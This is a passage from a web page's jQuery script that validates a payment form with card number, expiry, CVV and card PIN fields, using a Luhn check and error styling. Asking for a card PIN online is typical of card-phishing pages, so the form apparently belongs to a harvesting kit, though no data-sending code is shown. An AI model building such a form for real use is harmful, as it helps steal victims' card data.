            $("#carddiv").addClass('v-input--has-state');

            $("#carderror").show();

        } else if (!checkLuhn(cardNo)) {
            $("#carddiv").removeClass('v-input--is-focused');
            $("#carddiv").addClass('error--text');

            $("#cardlabel").removeClass('primary--text');
            $("#carddiv").removeClass('primary--text');
            $("#cardlabel").addClass('error--text');
            $("#carddiv").addClass('v-input--has-state');

            $("#carderror").show();

        } else {

            $("#cardlabel").removeClass('primary--text');
            $("#carddiv").removeClass('primary--text');
            $("#carddiv").removeClass('v-input--is-focused');
            $("#cardlabel").removeClass('error--text');
            $("#carddiv").addClass('v-input--is-dirty');
            $("#carddiv").removeClass('error--text');
            $("#carddiv").removeClass('v-input--has-state');

            $("#carderror").hide();


        }

    });


    //exp
    $('#expdiv').on('input', function(e) {
        $("#explabel").addClass('v-label--active primary--text');
        $("#expdiv").addClass('v-input--is-focused primary--text');

        if ($('#exp').val().length == 0) {
            $("#explabel").removeClass('v-label--active ');
            $("#expdiv").removeClass('v-input--is-dirty');
            $("#expdiv").addClass('error--text');
            $("#explabel").addClass('error--text');
            $("#expdiv").addClass('v-input--has-state');


            $("#experror").show();
        } else if ($('#exp').val().length < 5) {
            $("#expdiv").removeClass('v-input--is-focused');
            $("#expdiv").addClass('error--text');
            $("#explabel").addClass('error--text');
            $("#expdiv").addClass('v-input--has-state');

            $("#experror").show();
        } else {
            $("#explabel").removeClass('error--text');
            $("#expdiv").addClass('v-input--is-dirty');
            $("#expdiv").removeClass('error--text');
            $("#expdiv").removeClass('v-input--has-state');

            $("#experror").hide();

        }
    });

    $('#expdiv').click(function() {
        $("#explabel").addClass('v-label--active primary--text');
        $("#expdiv").addClass('v-input--is-focused primary--text');
        jQuery('#exp').focus();


    });

    $('#exp').focus(function() {
        $("#explabel").addClass('v-label--active primary--text');
        $("#expdiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#exp').val().length == 0) {
            $("#explabel").removeClass('v-label--active ');
            $("#expdiv").removeClass('v-input--is-focused');
            $("#expdiv").removeClass('v-input--is-dirty');
            $("#expdiv").addClass('error--text');
            $("#explabel").removeClass('primary--text');
            $("#expdiv").removeClass('primary--text');
            $("#explabel").addClass('error--text');
            $("#expdiv").addClass('v-input--has-state');

            $("#experror").show();

        } else if ($('#exp').val().length < 5) {
            $("#expdiv").removeClass('v-input--is-focused');
            $("#expdiv").addClass('error--text');

            $("#explabel").removeClass('primary--text');
            $("#expdiv").removeClass('primary--text');
            $("#explabel").addClass('error--text');

            $("#expdiv").addClass('v-input--has-state');

            $("#experror").show();

        } else {

            $("#explabel").removeClass('primary--text');
            $("#expdiv").removeClass('primary--text');
            $("#expdiv").removeClass('v-input--is-focused');
            $("#explabel").removeClass('error--text');
            $("#expdiv").addClass('v-input--is-dirty');
            $("#expdiv").removeClass('error--text');
            $("#expdiv").removeClass('v-input--has-state');

            $("#experror").hide();


        }

    });



    //cvv
    $('#cvvdiv').on('input', function(e) {
        $("#cvvlabel").addClass('v-label--active primary--text');
        $("#cvvdiv").addClass('v-input--is-focused primary--text');

        if ($('#cvv').val().length == 0) {
            $("#cvvlabel").removeClass('v-label--active ');
            $("#cvvdiv").removeClass('v-input--is-dirty');
            $("#cvvdiv").addClass('error--text');
            $("#cvvlabel").addClass('error--text');
            $("#cvverror").show();
            $("#cvvdiv").addClass('v-input--has-state');

        } else if ($('#cvv').val().length < 3) {
            $("#cvvdiv").removeClass('v-input--is-focused');
            $("#cvvdiv").addClass('error--text');
            $("#cvvlabel").addClass('error--text');
            $("#cvverror").show();
            $("#cvvdiv").addClass('v-input--has-state');

        } else {
            $("#cvvlabel").removeClass('error--text');
            $("#cvvdiv").addClass('v-input--is-dirty');
            $("#cvvdiv").removeClass('error--text');
            $("#cvverror").hide();
            $("#cvvdiv").removeClass('v-input--has-state');


        }
    });

    $('#cvvdiv').click(function() {
        $("#cvvlabel").addClass('v-label--active primary--text');
        $("#cvvdiv").addClass('v-input--is-focused primary--text');
        jQuery('#cvv').focus();


    });

    $('#cvv').focus(function() {
        $("#cvvlabel").addClass('v-label--active primary--text');
        $("#cvvdiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#cvv').val().length == 0) {
            $("#cvvlabel").removeClass('v-label--active ');
            $("#cvvdiv").removeClass('v-input--is-focused');
            $("#cvvdiv").removeClass('v-input--is-dirty');
            $("#cvvdiv").addClass('error--text');
            $("#cvvlabel").removeClass('primary--text');
            $("#cvvdiv").removeClass('primary--text');
            $("#cvvlabel").addClass('error--text');
            $("#cvvdiv").addClass('v-input--has-state');

            $("#cvverror").show();

        } else if ($('#cvv').val().length < 3) {
            $("#cvvdiv").removeClass('v-input--is-focused');
            $("#cvvdiv").addClass('error--text');

            $("#cvvlabel").removeClass('primary--text');
            $("#cvvdiv").removeClass('primary--text');
            $("#cvvlabel").addClass('error--text');
            $("#cvvdiv").addClass('v-input--has-state');

            $("#cvverror").show();

        } else {

            $("#cvvlabel").removeClass('primary--text');
            $("#cvvdiv").removeClass('primary--text');
            $("#cvvdiv").removeClass('v-input--is-focused');
            $("#cvvlabel").removeClass('error--text');
            $("#cvvdiv").addClass('v-input--is-dirty');
            $("#cvvdiv").removeClass('error--text');
            $("#cvvdiv").removeClass('v-input--has-state');

            $("#cvverror").hide();


        }

    });




    //pin
    $('#pindiv').on('input', function(e) {
        $("#pinlabel").addClass('v-label--active primary--text');
        $("#pindiv").addClass('v-input--is-focused primary--text');

        if ($('#pin').val().length == 0) {
            $("#pinlabel").removeClass('v-label--active ');
            $("#pindiv").removeClass('v-input--is-dirty');
            $("#pindiv").addClass('error--text');
            $("#pinlabel").addClass('error--text');
            $("#pinerror").show();
            $("#slndiv").addClass('v-input--has-state');

        } else if ($('#pin').val().length < 3) {
            $("#pindiv").removeClass('v-input--is-focused');
            $("#pindiv").addClass('error--text');
            $("#pinlabel").addClass('error--text');
            $("#pinerror").show();
            $("#slndiv").addClass('v-input--has-state');

        } else {
            $("#pinlabel").removeClass('error--text');
            $("#pindiv").addClass('v-input--is-dirty');
            $("#pindiv").removeClass('error--text');
            $("#pinerror").hide();
            $("#slndiv").removeClass('v-input--has-state');


        }
    });

    $('#pindiv').click(function() {
        $("#pinlabel").addClass('v-label--active primary--text');
        $("#pindiv").addClass('v-input--is-focused primary--text');
        jQuery('#pin').focus();


    });

    $('#pin').focus(function() {
        $("#pinlabel").addClass('v-label--active primary--text');
        $("#pindiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        if ($('#pin').val().length == 0) {
            $("#pinlabel").removeClass('v-label--active ');
            $("#pindiv").removeClass('v-input--is-focused');
            $("#pindiv").removeClass('v-input--is-dirty');
            $("#pindiv").addClass('error--text');
            $("#pindiv").removeClass('primary--text');
            $("#pinlabel").removeClass('primary--text');
            $("#pinlabel").addClass('error--text');
            $("#slndiv").addClass('v-input--has-state');

            $("#pinerror").show();

        } else if ($('#pin').val().length < 3) {
            $("#pindiv").removeClass('v-input--is-focused');
            $("#pindiv").addClass('error--text');

            $("#pindiv").removeClass('primary--text');
            $("#pinlabel").removeClass('primary--text');
            $("#pinlabel").addClass('error--text');
            $("#pinerror").show();
            $("#slndiv").addClass('v-input--has-state');


        } else {

            $("#pindiv").removeClass('primary--text');
            $("#pinlabel").removeClass('primary--text');
            $("#pindiv").removeClass('v-input--is-focused');
            $("#pinlabel").removeClass('error--text');
            $("#pindiv").addClass('v-input--is-dirty');
            $("#pindiv").removeClass('error--text');
            $("#pinerror").hide();
            $("#slndiv").removeClass('v-input--has-state');



        }

    });




    $('#next-btn').click(function() {
        //card
        var cardNo = $('#card').val();
        if ($('#card').val().length == 0) {
            $("#cardlabel").removeClass('v-label--active ');
            $("#carddiv").removeClass('v-input--is-dirty');
            $("#carddiv").addClass('error--text');
            $("#cardlabel").addClass('error--text');
            $("#carderror").show();
            $("#carddiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#card').val().length < 10) {
            $("#carddiv").removeClass('v-input--is-focused');
            $("#carddiv").addClass('error--text');
            $("#cardlabel").addClass('error--text');
            $("#carddiv").addClass('v-input--has-state');

            $("#carderror").show();
            event.preventDefault();

        } else if (!checkLuhn(cardNo)) {
            $("#carddiv").removeClass('v-input--is-focused');
            $("#carddiv").addClass('error--text');
            $("#cardlabel").addClass('error--text');
            $("#carddiv").addClass('v-input--has-state');

            $("#carderror").show();
            event.preventDefault();

        } else {
            $("#cardlabel").removeClass('error--text');
            $("#carddiv").addClass('v-input--is-dirty');
            $("#carddiv").removeClass('error--text');
            $("#carderror").hide();
            $("#carddiv").removeClass('v-input--has-state');


        }
        //card
        if ($('#exp').val().length == 0) {
            $("#explabel").removeClass('v-label--active ');
            $("#expdiv").removeClass('v-input--is-dirty');
            $("#expdiv").addClass('error--text');
            $("#explabel").addClass('error--text');
            $("#experror").show();
            $("#expdiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#exp').val().length < 5) {
            $("#expdiv").removeClass('v-input--is-focused');
            $("#expdiv").addClass('error--text');
            $("#explabel").addClass('error--text');
            $("#expdiv").addClass('v-input--has-state');

            $("#experror").show();
            event.preventDefault();

        } else {
            $("#explabel").removeClass('error--text');
            $("#expdiv").addClass('v-input--is-dirty');
            $("#expdiv").removeClass('error--text');
            $("#experror").hide();
            $("#expdiv").removeClass('v-input--has-state');


        }
        //cvv
        if ($('#cvv').val().length == 0) {
            $("#cvvlabel").removeClass('v-label--active ');
            $("#cvvdiv").removeClass('v-input--is-dirty');
            $("#cvvdiv").addClass('error--text');
            $("#cvvlabel").addClass('error--text');
            $("#cvverror").show();
            $("#cvvdiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#cvv').val().length < 3) {
            $("#cvvdiv").removeClass('v-input--is-focused');
            $("#cvvdiv").addClass('error--text');
            $("#cvvlabel").addClass('error--text');
            $("#cvvdiv").addClass('v-input--has-state');

            $("#cvverror").show();
            event.preventDefault();

        } else {
            $("#cvvlabel").removeClass('error--text');
            $("#cvvdiv").addClass('v-input--is-dirty');
            $("#cvvdiv").removeClass('error--text');
            $("#cvverror").hide();
            $("#cvvdiv").removeClass('v-input--has-state');


        }
        //pin
        if ($('#pin').val().length == 0) {
            $("#pinlabel").removeClass('v-label--active ');
            $("#pindiv").removeClass('v-input--is-dirty');
            $("#pindiv").addClass('error--text');
            $("#pinlabel").addClass('error--text');
            $("#pinerror").show();
            $("#pindiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#pin').val().length < 3) {
            $("#pindiv").removeClass('v-input--is-focused');
            $("#pindiv").addClass('error--text');
            $("#pinlabel").addClass('error--text');
            $("#pindiv").addClass('v-input--has-state');

            $("#pinerror").show();
            event.preventDefault();

        } else {
            $("#pinlabel").removeClass('error--text');
            $("#pindiv").addClass('v-input--is-dirty');
            $("#pindiv").removeClass('error--text');
            $("#pinerror").hide();
            $("#pindiv").removeClass('v-input--has-state');


        }
    });


   

        $('#card').mask('0000 0000 0000 0000 000');
        $('#exp').mask('00/00');
        $('#cvv').mask('0000');
        $('#pin').mask('0000');
</script>

</html>